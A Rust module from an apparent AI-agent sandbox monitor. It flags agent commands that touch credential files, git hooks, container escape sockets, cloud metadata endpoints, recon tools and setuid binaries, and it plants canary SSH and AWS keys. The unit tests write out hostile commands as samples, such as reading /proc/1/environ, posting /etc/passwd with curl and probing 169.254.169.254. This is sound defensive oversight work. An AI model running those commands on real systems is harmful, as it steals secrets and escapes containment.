//! The detection table of protocol §1.1, in one place so the native tier, the
//! guest-agent and the dashboard agree on spelling and severity.
//!
//! Two feeds reach it:
//!   * every `exec` command line and every `process.start` argv (both tiers);
//!   * the exe path of every process that starts (setuid bits, escape probes).
//!
//! The authoritative feeds live outside this crate and outside the sandbox
//! (D18): Seatbelt denial reports on the native tier, seccomp SIGSYS in the VM
//! tier, the egress proxy for network. This module is enrichment — it sees an
//! *intent* on a command line, which is why nothing here blocks anything.
//!
//! design: substring matching over command lines and argv. It misses a path
//! opened from inside a process (a Python script reading `~/.ssh/id_rsa` never
//! puts it in an argv). The syscall-accurate upgrades are already designed in:
//! bpftrace `sys_enter_openat` on hosts with BTF (D19), and the Seatbelt
//! reporter on macOS, which does see every open. inotify is deliberately not
//! used in the VM tier: the workspace is a virtiofs bind mount and inotify does
//! not deliver events across it.

use proto::{rules as r, Severity};
use std::sync::{Arc, RwLock};

/// One matched rule.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Hit {
    pub rule: &'static str,
    pub severity: Severity,
    pub path: String,
}

/// Paths whose *read* is reportable (protocol §1.1 `sensitive_path.read`).
const READ_ABS: &[&str] = &["/etc/shadow", "/proc/1/environ", "/etc/sudoers", "/etc/master.passwd"];
/// Home-relative fragments; checked against both `$HOME/x` and the literal `~/x`.
const READ_HOME: &[&str] = &[".ssh", ".aws", ".config/gh", ".netrc", ".config/gcloud", ".kube/config"];

/// Paths whose *write* is reportable. Persistence primitives: a hook, a workflow,
/// a task file or a shell rc turns one tool call into every future one.
const WRITE_ANY: &[&str] = &[".git/hooks", ".git/config", ".github/workflows", ".vscode/tasks.json", ".envrc"];
const WRITE_HOME: &[&str] = &[".bashrc", ".zshrc", ".profile", ".bash_profile", ".zshenv"];
// `/etc` is deliberately not scanned here: reading it is normal and writing it is
// already impossible from inside the boundary, which reports the attempt itself
// as `sandbox.denied`. Scanning for it would only add false positives.

/// Container and kernel escape surfaces (protocol §1.1 `escape.probe`).
const ESCAPE_PATHS: &[&str] = &[
    "/var/run/docker.sock",
    "/run/docker.sock",
    "/run/podman/podman.sock",
    "/dev/kvm",
    "/proc/1/root",
    "/proc/sys/kernel/core_pattern",
    "/sys/fs/cgroup/release_agent",
    "/var/run/crio/crio.sock",
    "/run/containerd/containerd.sock",
];
/// Binaries whose whole purpose is to leave a namespace.
const ESCAPE_BINS: &[&str] = &["nsenter", "unshare", "setns", "runc", "ctr", "crictl"];
/// Host inventory tools: nothing an agent needs for a coding task, everything an
/// attacker wants first. Reported, not blocked (the sandbox denies the sysctls
/// behind the network ones anyway).
const RECON_BINS: &[&str] =
    &["ifconfig", "netstat", "system_profiler", "ioreg", "scutil", "dscl", "arp", "launchctl", "nmap", "ip"];
/// Privilege-escalation binaries by name: Seatbelt refuses setuid execs silently
/// (no log line), so the command line is the only place to see the attempt.
const SETUID_BINS: &[&str] = &["sudo", "su", "doas", "passwd", "chsh", "chpass", "login", "newgrp", "pkexec"];
/// Words that run the command after them, so the command word is the next one.
const WRAPPERS: &[&str] = &["env", "exec", "command", "builtin", "nohup", "nice", "time", "xargs"];
/// Cloud metadata endpoints (protocol §1.1 `metadata.probe`). The proxy sees the
/// network attempt; this catches the address on a command line even when the
/// connection never leaves the process.
pub const METADATA_HOSTS: &[&str] =
    &["169.254.169.254", "metadata.google.internal", "100.100.100.200", "metadata.azure.com"];

/// What this daemon watches, as JSON for `HostRegister.policy` → dashboard Policy page.
pub fn policy_summary(egress: &proto::EgressPolicy) -> serde_json::Value {
    let home = |xs: &[&str]| xs.iter().map(|p| format!("~/{p}")).collect::<Vec<_>>();
    let sensitive_read: Vec<String> = READ_ABS.iter().map(|s| s.to_string()).chain(home(READ_HOME)).collect();
    let sensitive_write: Vec<String> = WRITE_ANY.iter().map(|s| s.to_string()).chain(home(WRITE_HOME)).collect();
    let rules: Vec<_> = proto::rules::CATALOGUE
        .iter()
        .map(|(rule, severity, description)| serde_json::json!({ "rule": rule, "severity": severity, "description": description }))
        .collect();
    serde_json::json!({
        "egress": egress,
        "rules": rules,
        "watch": {
            "sensitive_read": sensitive_read,
            "sensitive_write": sensitive_write,
            "escape_paths": ESCAPE_PATHS,
            "escape_bins": ESCAPE_BINS,
            "recon_bins": RECON_BINS,
            "setuid_bins": SETUID_BINS,
            "metadata_hosts": METADATA_HOSTS,
            "canaries": ["~/.ssh/id_rsa", "~/.aws/credentials"],
            "protected_env": crate::spawn::PROTECTED_ENV,
        },
    })
}

/// The harness user's home, read off the workspace path (`/Users/x/…`, `/home/x/…`)
/// for tiers where the daemon's own HOME is not it (remote), so references to
/// that user's dotfiles and to anything else under it are still reported.
fn home_of(workspace: &str) -> Option<String> {
    let mut it = workspace.split('/').filter(|s| !s.is_empty());
    match (it.next(), it.next()) {
        (Some(root @ ("Users" | "home")), Some(user)) => Some(format!("/{root}/{user}")),
        _ => None,
    }
}

/// Everything a sandbox needs in order to decide whether a path is interesting.
#[derive(Debug, Clone)]
pub struct Rules {
    /// The one directory a sandbox may write to, and the host user's home it
    /// lives under. Shared between clones (the exec path and procmon hold one
    /// each) because a pooled microVM learns its workspace only when the tar
    /// arrives, after both were built.
    loc: Arc<RwLock<Loc>>,
    /// The sandbox's own HOME (`/home/agent` in a VM, `/tmp/sbx-<id>/home` native).
    pub home: String,
    /// Planted files whose only purpose is to be read by something that should
    /// not have (protocol §1.1 `canary.read`).
    pub canaries: Vec<String>,
}

#[derive(Debug, Default, Clone)]
struct Loc {
    workspace: String,
    host_home: Option<String>,
}

impl Default for Rules {
    fn default() -> Self {
        Self { loc: Default::default(), home: String::new(), canaries: Vec::new() }
    }
}

fn hit(rule: &'static str, severity: Severity, path: impl Into<String>) -> Hit {
    Hit { rule, severity, path: path.into() }
}

impl Rules {
    /// Rules for a VM/container sandbox: HOME is the image's, canaries are the
    /// dotfiles the image plants.
    pub fn guest(workspace: &str, home: &str) -> Self {
        let r = Self { loc: Default::default(), home: home.to_string(), canaries: Self::canary_files(home) };
        r.set_workspace(workspace);
        r
    }

    pub fn workspace(&self) -> String {
        self.loc.read().unwrap().workspace.clone()
    }

    /// Points the rules at a workspace: explicitly (`SBX_WORKSPACE`, the kernel
    /// cmdline) or when a tar lands in a pooled guest that had none yet.
    pub fn set_workspace(&self, workspace: &str) {
        let host_home = std::env::var("SBX_HOST_HOME")
            .ok()
            .filter(|h| !h.is_empty())
            .or_else(|| home_of(workspace))
            .filter(|h| *h != self.home);
        *self.loc.write().unwrap() = Loc { workspace: workspace.to_string(), host_home };
    }

    /// True until something told us where the workspace is.
    pub fn workspace_unknown(&self) -> bool {
        let w = self.workspace();
        w.is_empty() || w == self.home
    }

    /// Writes the canaries into `home` (creating `.ssh`/`.aws`), each carrying a
    /// per-sandbox token so an exfiltrated copy names where it came from. Files
    /// that already exist are left alone. Errors are not fatal: a HOME that is
    /// not writable simply has no canaries, which the rules still detect by path.
    pub fn plant_canaries(home: &str, sandbox_id: &str) {
        Self::plant(home, sandbox_id, false)
    }

    /// Same, but replaces files that are already there. A restored snapshot has
    /// the *previous* sandbox's canary tokens on disk; leaving them would name
    /// the wrong sandbox in the `canary.read` evidence.
    pub fn replant_canaries(home: &str, sandbox_id: &str) {
        Self::plant(home, sandbox_id, true)
    }

    fn plant(home: &str, sandbox_id: &str, overwrite: bool) {
        let token = format!("sbx-canary-{sandbox_id}-{}", ulid::Ulid::new());
        let files = [
            (
                ".ssh/id_rsa",
                format!("-----BEGIN OPENSSH PRIVATE KEY-----\n{token}\n-----END OPENSSH PRIVATE KEY-----\n"),
            ),
            (
                ".aws/credentials",
                format!(
                    "[default]\naws_access_key_id = AKIA{}\naws_secret_access_key = {token}\n",
                    sandbox_id.to_uppercase()
                ),
            ),
        ];
        // No `.netrc`: git and curl read it on every https request, so it alerted on a plain
        // `git clone`. A canary is only a canary if nothing legitimate opens it.
        for (rel, body) in files {
            let path = std::path::Path::new(home).join(rel);
            if path.exists() && !overwrite {
                continue;
            }
            if let Some(dir) = path.parent() {
                let _ = std::fs::create_dir_all(dir);
            }
            let _ = std::fs::write(&path, body);
        }
    }

    /// Canary paths for a fresh sandbox, in the order the backend should plant
    /// them. `<workspace>/.env.production` is deliberately absent: it is a real
    /// user directory and we do not write files into it. The native tier denies
    /// and reports a read of that path from the sandbox profile instead.
    pub fn canary_files(home: &str) -> Vec<String> {
        vec![format!("{home}/.ssh/id_rsa"), format!("{home}/.aws/credentials")]
    }

    fn contains(text: &str, needle: &str) -> bool {
        !needle.is_empty() && text.contains(needle)
    }

    /// Scans one command line (or a joined argv) for reportable paths. Returns
    /// the distinct rules matched, worst first, so a caller can alert on all of
    /// them without deduplicating.
    pub fn scan(&self, text: &str) -> Vec<Hit> {
        let mut out: Vec<Hit> = Vec::new();
        let mut add = |h: Hit| {
            if !out.iter().any(|e| e.rule == h.rule && e.path == h.path) {
                out.push(h);
            }
        };

        for c in &self.canaries {
            // `~/.ssh/id_rsa` on a command line is the same file as `$HOME/.ssh/id_rsa`.
            let tilde =
                c.strip_prefix(self.home.as_str()).filter(|_| !self.home.is_empty()).map(|rest| format!("~{rest}"));
            if Self::contains(text, c) || tilde.is_some_and(|t| text.contains(&t)) {
                add(hit(r::CANARY_READ, Severity::Critical, c));
            }
        }
        for p in ESCAPE_PATHS {
            if Self::contains(text, p) {
                add(hit(r::ESCAPE_PROBE, Severity::Critical, *p));
            }
        }
        for h in METADATA_HOSTS {
            if Self::contains(text, h) {
                add(hit(r::METADATA_PROBE, Severity::High, *h));
            }
        }
        for p in WRITE_ANY {
            if Self::contains(text, p) {
                add(hit(r::SENSITIVE_PATH_WRITE, Severity::High, *p));
            }
        }
        for p in WRITE_HOME {
            let abs = format!("{}/{p}", self.home);
            if Self::contains(text, &abs) || Self::contains(text, &format!("~/{p}")) {
                add(hit(r::SENSITIVE_PATH_WRITE, Severity::High, abs));
            }
        }
        for p in READ_ABS {
            if Self::contains(text, p) {
                add(hit(r::SENSITIVE_PATH_READ, Severity::Medium, *p));
            }
        }
        // Command words only — the first of each pipeline segment, past `VAR=x` and
        // wrappers: `sudo -n true`, `x && su -`, `/usr/bin/sudo`, `env sudo`; not the
        // arguments of `cat /etc/passwd` or `curl -d @/etc/passwd`.
        for seg in text.split(|c: char| matches!(c, ';' | '|' | '&' | '(' | ')' | '`' | '\n')) {
            let mut words = seg.split_whitespace().skip_while(|w| w.contains('=') || WRAPPERS.contains(w));
            let Some(w) = words.next() else { continue };
            let name = w.rsplit('/').next().unwrap_or(w);
            if SETUID_BINS.contains(&name) {
                add(hit(r::SETUID_EXEC, Severity::Medium, w));
            }
            if RECON_BINS.contains(&name) {
                add(hit(r::HOST_RECON, Severity::Medium, w));
            }
        }
        let loc = self.loc.read().unwrap().clone();
        for p in READ_HOME {
            let abs = format!("{}/{p}", self.home);
            if Self::contains(text, &abs) || Self::contains(text, &format!("~/{p}")) {
                add(hit(r::SENSITIVE_PATH_READ, Severity::Medium, abs));
            }
            if let Some(hh) = &loc.host_home {
                let abs = format!("{hh}/{p}");
                if Self::contains(text, &abs) {
                    add(hit(r::SENSITIVE_PATH_READ, Severity::Medium, abs));
                }
            }
        }
        // Any other host-home path outside the workspace: the sandbox has no
        // business there, whether or not the mount exists.
        if let Some(hh) = &loc.host_home {
            for w in text.split(|c: char| {
                c.is_whitespace() || matches!(c, ';' | '|' | '&' | '(' | ')' | '`' | '\'' | '"' | '>' | '<')
            }) {
                if w.starts_with(hh.as_str()) && !w.starts_with(loc.workspace.as_str()) {
                    add(hit(r::WORKSPACE_ESCAPE, Severity::Low, w));
                }
            }
        }
        out.sort_by(|a, b| b.severity.cmp(&a.severity));
        out
    }

    /// Rules that key on the executable itself rather than its arguments:
    /// a setuid/setgid bit, or a namespace tool.
    pub fn scan_exe(exe: &str) -> Option<Hit> {
        let name = exe.rsplit('/').next().unwrap_or(exe);
        if ESCAPE_BINS.contains(&name) {
            return Some(hit(r::ESCAPE_PROBE, Severity::Critical, exe));
        }
        if ESCAPE_PATHS.contains(&exe) {
            return Some(hit(r::ESCAPE_PROBE, Severity::Critical, exe));
        }
        if is_setid(exe) {
            return Some(hit(r::SETUID_EXEC, Severity::Medium, exe));
        }
        None
    }
}

/// True when the file carries S_ISUID or S_ISGID. Reading the mode is exact,
/// which beats a hard-coded list of `sudo`-like names.
pub fn is_setid(path: &str) -> bool {
    use std::os::unix::fs::MetadataExt;
    std::fs::metadata(path).map(|m| m.mode() & (libc::S_ISUID as u32 | libc::S_ISGID as u32) != 0).unwrap_or(false)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rules() -> Rules {
        Rules::guest("/w", "/home/agent")
    }

    #[test]
    fn the_gate_commands_all_fire_their_rule() {
        let r = rules();
        // Gate F, VM tier.
        assert_eq!(r.scan("cat /proc/1/environ")[0].rule, r::SENSITIVE_PATH_READ);
        assert_eq!(r.scan("echo x > .git/hooks/pre-commit")[0].rule, r::SENSITIVE_PATH_WRITE);
        // Gate F, native tier (canary beats the plain sensitive-path rule; `~/` is the same file).
        assert_eq!(r.scan("cat ~/.ssh/id_rsa")[0].rule, r::CANARY_READ);
        let h = r.scan("cat /home/agent/.ssh/id_rsa");
        assert_eq!(h[0].rule, r::CANARY_READ);
        assert_eq!(h[0].severity, Severity::Critical);
        assert!(h.iter().any(|x| x.rule == r::SENSITIVE_PATH_READ), "both rules are reported");
    }

    #[test]
    fn escape_and_metadata_probes() {
        let r = rules();
        assert_eq!(r.scan("ls -l /var/run/docker.sock")[0].rule, r::ESCAPE_PROBE);
        assert_eq!(r.scan("curl http://169.254.169.254/latest/meta-data/")[0].rule, r::METADATA_PROBE);
        assert_eq!(Rules::scan_exe("/usr/bin/nsenter").unwrap().rule, r::ESCAPE_PROBE);
        assert_eq!(Rules::scan_exe("/bin/ls"), None);
    }

    #[test]
    fn setuid_names_on_the_command_line_fire() {
        let r = rules();
        assert_eq!(r.scan("sudo -n true").iter().filter(|h| h.rule == r::SETUID_EXEC).count(), 1);
        assert_eq!(r.scan("ls; /usr/bin/su - root").iter().filter(|h| h.rule == r::SETUID_EXEC).count(), 1);
        assert_eq!(r.scan("FOO=1 env sudo id").iter().filter(|h| h.rule == r::SETUID_EXEC).count(), 1);
        assert_eq!(r.scan("echo x | passwd").iter().filter(|h| h.rule == r::SETUID_EXEC).count(), 1);
        // A setuid name as an argument is not an exec of it.
        for cmd in ["cat /etc/passwd", "curl -d @/etc/passwd https://x", "man sudo", "grep -r login ."] {
            assert!(r.scan(cmd).iter().all(|h| h.rule != r::SETUID_EXEC), "{cmd}");
        }
        assert!(r.scan("echo sudoku && cat suffix").is_empty());
    }

    #[test]
    fn host_home_paths_are_flagged_inside_a_vm() {
        let r = Rules::guest("/Users/me/repo", "/home/agent"); // host home derived from the workspace
        let hits = r.scan("cat /Users/me/.ssh/id_rsa");
        assert!(hits.iter().any(|h| h.rule == r::SENSITIVE_PATH_READ && h.path == "/Users/me/.ssh"));
        let hits = r.scan("touch /Users/me/outside");
        assert!(hits.iter().any(|h| h.rule == r::WORKSPACE_ESCAPE));
        assert!(r.scan("ls /Users/me/repo/src").is_empty(), "the workspace itself is fine");
    }

    #[test]
    fn host_home_from_workspace() {
        assert_eq!(home_of("/Users/alice/src/app"), Some("/Users/alice".into()));
        assert_eq!(home_of("/home/nihil"), Some("/home/nihil".into()));
        assert_eq!(home_of("/srv/build"), None);
        let r = Rules::guest("/Users/alice/src/app", "/home/agent");
        assert!(r.scan("touch /Users/alice/proof").iter().any(|h| h.rule == r::WORKSPACE_ESCAPE));
        assert!(r.scan("cat /Users/alice/.ssh/id_rsa").iter().any(|h| h.rule == r::SENSITIVE_PATH_READ));
    }

    #[test]
    fn pooled_guest_learns_its_workspace_late() {
        let r = Rules::guest("/home/agent", "/home/agent");
        assert!(r.workspace_unknown());
        let clone = r.clone();
        r.set_workspace("/Users/alice/src/app");
        assert!(!clone.workspace_unknown(), "clones share the location");
        assert!(clone.scan("touch /Users/alice/proof").iter().any(|h| h.rule == r::WORKSPACE_ESCAPE));
        assert!(clone.scan("touch /Users/alice/src/app/x").iter().all(|h| h.rule != r::WORKSPACE_ESCAPE));
    }

    #[test]
    fn tilde_canary_matches() {
        let r = Rules::guest("/w", "/home/agent");
        assert_eq!(r.scan("cat ~/.ssh/id_rsa")[0].rule, r::CANARY_READ);
        assert_eq!(r.scan("cat /home/agent/.aws/credentials")[0].rule, r::CANARY_READ);
        // .netrc is a sensitive path, not a canary: git reads it on every https clone.
        assert_eq!(r.scan("cat /home/agent/.netrc")[0].rule, r::SENSITIVE_PATH_READ);
    }

    #[test]
    fn recon_tools_are_reported() {
        let r = rules();
        assert!(r.scan("ifconfig -a | head").iter().any(|h| h.rule == r::HOST_RECON));
        assert!(r.scan("netstat -rn").iter().any(|h| h.rule == r::HOST_RECON));
        assert!(r.scan("git status").is_empty());
    }

    #[test]
    fn ordinary_commands_are_silent() {
        let r = rules();
        for quiet in ["cargo build --release", "rg -n foo .", "npm ci", "git status", "ls -la /w/src"] {
            assert!(r.scan(quiet).is_empty(), "{quiet:?} must not alert");
        }
    }

    #[test]
    fn setuid_detection_reads_the_mode_not_a_name_list() {
        // /usr/bin/sudo is setuid root on every macOS and every Debian we target.
        if std::path::Path::new("/usr/bin/sudo").exists() {
            assert!(is_setid("/usr/bin/sudo"));
            assert_eq!(Rules::scan_exe("/usr/bin/sudo").unwrap().rule, r::SETUID_EXEC);
        }
        assert!(!is_setid("/bin/ls"));
        assert!(!is_setid("/nonexistent"));
    }

    #[test]
    fn an_empty_home_matches_nothing() {
        // A misconfigured sandbox must not turn every path into an alert.
        let r = Rules { canaries: vec![String::new()], ..Default::default() };
        assert!(r.scan("cat /etc/hosts").iter().all(|h| h.rule != r::CANARY_READ));
    }
}
